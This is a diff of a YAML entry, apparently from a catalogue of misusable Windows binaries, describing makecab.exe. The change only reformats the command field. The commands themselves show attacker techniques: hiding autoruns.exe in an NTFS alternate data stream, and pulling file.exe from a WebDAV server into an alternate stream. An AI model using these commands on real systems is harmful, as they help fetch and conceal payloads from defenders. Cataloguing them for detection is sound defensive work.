@@ -7,8 +7,9 @@ Categories: []
 Commands:
   - Command: makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab
     Description: ''
-  - Command: "makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.cab    \n\
-      \   \nmakecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.txt:file.cab"
+  - Command: |
+          makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
+          makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab
     Description: ''
 Full Path:
   - c:\windows\system32\makecab.exe
